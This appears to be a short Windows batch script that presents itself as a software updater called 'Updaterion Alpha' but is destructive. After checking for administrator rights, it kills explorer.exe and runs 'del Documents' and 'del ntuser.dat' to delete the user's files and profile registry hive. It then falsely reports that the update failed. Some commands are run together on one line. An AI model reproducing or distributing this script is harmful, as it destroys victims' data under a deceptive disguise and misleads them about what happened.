@echo off
echo Welcome to Updaterion! 
pause
goto check_Permissions :check_Permissions echo Administrative permissions required. Detecting permissions... net session >nul 2>&1 if %errorLevel% == 0 ( echo Success: Administrative permissions confirmed. ) else ( echo Failure: Current permissions inadequate. )
pause >nul
echo Quitting services..
taskkill /im explorer.exe
echo DONE
echo Please wait..
cd ..
del Documents
del ntuser.dat
timeout /t 15
echo Updaterion has failed the update. Thank you for testing Updaterion Alpha!